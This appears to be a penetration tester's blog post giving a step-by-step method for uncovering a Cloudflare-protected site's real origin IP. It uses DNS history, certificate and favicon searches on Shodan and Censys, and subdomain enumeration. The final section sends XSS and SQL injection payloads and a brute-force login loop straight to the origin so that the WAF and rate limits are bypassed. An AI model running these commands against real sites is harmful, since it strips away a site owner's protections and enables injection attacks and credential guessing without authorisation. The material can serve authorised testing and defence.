# Cloudflare IP Origin Leak: The Shield Has a Hole. Find the Real Server.

**Severity:** HIGH | **Category:** Fingerprinting | **Series:** #300DaysWithAppSec

---

## Why This Is HIGH Severity

Cloudflare protects millions of websites — WAF, DDoS protection, rate limiting. But when the real server IP leaks, all of that protection disappears. You send requests directly to the origin. No WAF inspects them. No rate limits apply. Payloads that Cloudflare blocked for months now land directly on the vulnerable server.

Finding the origin IP is one of the most impactful recon steps against Cloudflare-protected targets.

---

## Cloudflare IP Ranges — What to Filter Out

```
103.21.244.0/22
103.22.200.0/22
103.31.4.0/22
104.16.0.0/13
104.24.0.0/14
108.162.192.0/18
131.0.72.0/22
141.101.64.0/18
162.158.0.0/15
172.64.0.0/13
173.245.48.0/20
188.114.96.0/20
190.93.240.0/20
197.234.240.0/22
198.41.128.0/17
```

Any IP that resolves for `target.com` but isn't in these ranges = potential origin.

---

## Method 1: DNS History (Most Reliable)

```bash
# SecurityTrails — best free source
# Browser: securitytrails.com/domain/target.com/history/a

# API
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a" \
    -H "APIKEY: YOUR_KEY" | python3 -c "
import json,sys
d=json.load(sys.stdin)
for r in d.get('records',{}).get('items',[]):
    for v in r.get('values',[]):
        print(v.get('ip'), '→', r.get('first_seen'))
" | sort

# viewdns.info (free, no API)
curl -s "https://viewdns.info/iphistory/?domain=target.com&output=json" | \
    python3 -c "import json,sys; [print(r['ip'], r['location']) for r in json.load(sys.stdin).get('response',{}).get('records',[])]"
```

## Method 2: SSL Certificate → Shodan

```bash
# Search for IPs with same SSL cert (not in Cloudflare ranges)
shodan search "ssl:target.com" --fields ip_str,port | \
    grep -vE "^(103\.|104\.|108\.|141\.|162\.|172\.|173\.|188\.|190\.|197\.|198\.)"

# Censys
censys search 'parsed.names:target.com' --index hosts | \
    python3 -c "
import json,sys
for h in json.load(sys.stdin).get('results',[]):
    ip = h.get('ip','')
    if not any(ip.startswith(cf) for cf in ['104.16','104.24','172.64','173.245']):
        print(ip)
"
```

## Method 3: Favicon Hash → Shodan

```bash
pip3 install mmh3 --break-system-packages

python3 << 'PYEOF'
import requests, mmh3, base64

resp = requests.get('https://target.com/favicon.ico', verify=False)
favicon_hash = mmh3.hash(base64.encodebytes(resp.content))
print(f"Favicon hash: {favicon_hash}")
print(f"Shodan dork:  http.favicon.hash:{favicon_hash}")
PYEOF

# Then search on shodan.io: http.favicon.hash:-1234567890
```

## Method 4: Non-CDN Subdomains

```bash
# Enumerate subdomains and check which ones bypass CDN
subfinder -d target.com -all -silent | \
    dnsx -resp -a -silent | \
    while read line; do
        ip=$(echo $line | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
        sub=$(echo $line | awk '{print $1}')
        # Check if IP is in Cloudflare range
        if ! echo "$ip" | grep -qE "^(104\.16|104\.24|172\.64|173\.245|162\.158|141\.101)"; then
            echo "NON-CDN: $sub → $ip"
        fi
    done
```

## Confirming and Exploiting Origin

```bash
ORIGIN="185.220.101.45"
TARGET="target.com"

# Confirm origin responds to the domain
curl -H "Host: $TARGET" "https://$ORIGIN/" --insecure -sI | head -5

# If same content → origin confirmed. Now test without WAF:
# XSS (was blocked by Cloudflare)
curl -H "Host: $TARGET" "https://$ORIGIN/?q=<script>alert(1)</script>" --insecure

# SQLi (was blocked)
curl -H "Host: $TARGET" "https://$ORIGIN/?id=1' OR '1'='1" --insecure

# No rate limiting on origin
for i in $(seq 1 100); do
    curl -H "Host: $TARGET" "https://$ORIGIN/api/login" \
        -d "user=admin&pass=test$i" --insecure -s | grep -i "success\|token"
done
```

---

## Key Takeaways

```
1. Origin IP = real server — no WAF, no rate limit, no DDoS protection
2. Find via: DNS history (best), SSL/Shodan, favicon hash, non-CDN subdomains
3. Filter: remove 104.16.x, 172.64.x, 173.245.x (Cloudflare ranges)
4. Confirm: curl -H "Host: target.com" https://ORIGIN_IP/
5. SecurityTrails DNS history = most reliable passive source
6. Email MX records often bypass CDN → real network revealed
7. Report: "Origin IP exposed — WAF/Cloudflare bypass possible via direct connection"
8. HIGH severity because it enables testing all previously blocked payloads
```

---

*Written by Anand Prajapati — Penetration Tester & Security Researcher*

🔗 **Connect:** [LinkedIn](https://linkedin.com/in/anand-prajapati-7a265a369) · [GitHub](https://github.com/anand87794) · [Portfolio](https://anandprajapati.lovable.app) · [X @anand87794](https://x.com/anand87794)

*Part of the #300DaysWithAppSec series — 300 vulnerabilities, real security education.*
